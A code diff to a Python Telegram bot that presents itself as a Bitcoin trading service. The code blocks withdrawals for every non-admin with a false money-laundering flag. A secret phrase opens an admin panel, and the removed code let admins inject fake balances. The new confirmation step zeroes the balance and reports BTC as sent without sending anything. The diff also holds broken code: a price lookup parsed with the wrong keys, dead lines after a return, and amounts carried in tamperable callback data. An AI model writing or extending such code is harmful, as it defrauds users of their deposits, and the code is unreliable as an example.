@@ -81,6 +81,12 @@ def get_admin_menu():
         [InlineKeyboardButton("❌ Close Admin Panel", callback_data="close_admin")]
     ])
 
+def get_withdrawal_confirmation(uid, addr, net, fee):
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(f"✅ Yes, send {net:.8f} BTC", callback_data=f"confirm_withdraw:{addr}:{net}:{fee}"),
+         InlineKeyboardButton("❌ Cancel", callback_data="cancel_withdraw")]
+    ])
+
 # Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -113,13 +119,25 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "withdrawal":
         if not is_admin(uid):
-            await query.edit_message_text("❌ Transaction failed. Your account was flagged for suspicious activity related to money laundering. Please, allow our team to resolve this before attempting to withdrawal again. ", reply_markup=get_main_menu())
+            await query.edit_message_text("❌ Transaction failed. Your account was flagged for suspicious activity related to money laundering.", reply_markup=get_main_menu())
         elif balance <= 0:
             await query.edit_message_text("❌ Balance is 0.", reply_markup=get_main_menu())
         else:
-            pending_withdrawal[uid] = 1
-            await query.edit_message_text("🙋 Enter BTC withdrawal address:")
-            log_action(uid, "Initiated Withdrawal", {"balance": balance})
+            await query.edit_message_text(
+                "Enter withdrawal address:", reply_markup=None)
+            pending_withdrawal[uid] = {"step": 1, "amount": balance}
+            log_action(uid, "Started Withdrawal")
+
+    elif cmd.startswith("confirm_withdraw:"):
+        _, addr, net, fee = cmd.split(":")
+        net, fee = float(net), float(fee)
+        set_balance(uid, 0.0)
+        log_action(uid, "Withdrew BTC", {"net": net, "fee": fee, "address": addr})
+        await query.edit_message_text(f"✅ Sent {net:.8f} BTC to `{addr}`\n(5% fee was applied)", parse_mode="Markdown", reply_markup=get_main_menu())
+
+    elif cmd == "cancel_withdraw":
+        pending_withdrawal.pop(uid, None)
+        await query.edit_message_text("❌ Withdrawal cancelled.", reply_markup=get_main_menu())
 
     elif cmd == "run":
         await query.edit_message_text("✅ Bot started.", reply_markup=get_main_menu())
@@ -131,7 +149,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "monitor":
         try:
-            price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()['bitcoin']['usd']
+            price = requests.get("https://api.coinbase.com/v2/prices/BTC-USD/spot").json()['bitcoin']['usd']
         except:
             price = "unknown"
         strategy = user_strategies.get(uid, "None")
@@ -199,7 +217,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     msg = update.message.text.strip()
 
-    # Toggle admin panel
     if msg == SECRET_PHRASE:
         admin_mode[uid] = not admin_mode.get(uid, False)
         if admin_mode[uid]:
@@ -210,34 +227,17 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             log_action(uid, "Admin Panel Disabled")
         return
 
-    # Injection flow
-    if pending_inject.get(uid):
-        if not is_admin(uid):
-            await update.message.reply_text("❌ Admin only.")
-            pending_inject.pop(uid, None)
-            return
-        try:
-            amt = float(msg)
-            if amt <= 0:
-                raise ValueError()
-            set_balance(uid, get_balance(uid) + amt)
-            pending_inject.pop(uid)
-            log_action(uid, "Injected BTC", {"amount": amt})
-            await update.message.reply_text(f"Added {amt:.8f} BTC")
-        except:
-            await update.message.reply_text("Invalid amount. Try again.")
-        return
-
-    # Withdrawal flow
-    if uid in pending_withdrawal and pending_withdrawal[uid] == 1:
+    if uid in pending_withdrawal and pending_withdrawal[uid].get("step") == 1:
         addr = msg
-        bal = get_balance(uid)
-        fee = bal * 0.05  # 5% fee
+        bal = pending_withdrawal[uid]["amount"]
+        fee = bal * 0.05
         net = bal - fee
-        if net <= 0:
-            await update.message.reply_text("❌ Balance too low after fee.")
-            pending_withdrawal.pop(uid)
-            return
+        pending_withdrawal.pop(uid, None)
+        await update.message.reply_text(
+            f"Confirm sending {net:.8f} BTC (5% fee) to `{addr}`:", parse_mode="Markdown",
+            reply_markup=get_withdrawal_confirmation(uid, addr, net, fee)
+        )
+        return
         set_balance(uid, 0.0)
         pending_withdrawal.pop(uid)
         log_action(uid, "Withdrew BTC", {"net": net, "address": addr})
@@ -322,3 +322,4 @@ async def start_bot():
 
 if __name__ == "__main__":
     asyncio.run(start_bot())
+
